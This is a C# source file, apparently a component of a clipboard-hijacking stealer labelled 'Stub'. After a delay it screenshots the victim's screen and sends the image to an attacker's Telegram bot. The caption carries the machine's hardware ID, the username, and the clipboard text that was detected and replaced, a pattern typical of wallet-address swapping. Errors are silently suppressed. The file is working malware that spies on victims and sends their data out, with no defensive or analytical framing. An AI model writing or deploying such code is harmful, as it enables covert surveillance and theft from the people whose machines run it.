using System;
using System.Drawing;
using System.Net.Http;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using Stub.Help;

namespace Stub.TelegramAPI
{
    class ScreenSend
    {
        public async static void POST_RUN(string buf, string newbuf)
        {
            try
            {
                await Task.Run(async () =>
                {
                    await Task.Delay(60000); // Замена Thread.Sleep на Task.Delay

                    string message = $"🆔 {HWID.GetHardwareId().ToString()} - 👤{Environment.UserName}" +
                        $"\n💸 Detected:" +
                        $"\n<code>{buf}</code>\n\n✅Successfully Replaced:\n<code>{newbuf}</code>";

                    using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                    {
                        using (Graphics graphics = Graphics.FromImage(screenshot))
                        {
                            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                            using (MemoryStream ms = new MemoryStream())
                            {
                                screenshot.Save(ms, ImageFormat.Png);

                                string url = $"https://api.telegram.org/bot{Config.botToken}/sendPhoto?chat_id={Config.chatId}&parse_mode=HTML&caption={message}";
                                SSL.GetSSL();

                                using (HttpClient client = new HttpClient())
                                {
                                    MultipartFormDataContent content = new MultipartFormDataContent();
                                    content.Add(new ByteArrayContent(ms.ToArray()), "photo", "screenshot.png");

                                    HttpResponseMessage response = await client.PostAsync(url, content);

                                    if (!response.IsSuccessStatusCode)
                                    {
                                        //Console.WriteLine("Ошибка при отправке скриншота");
                                    }
                                }
                            }
                        }
                    }
                });
            }
            catch { }
        }
    }

}
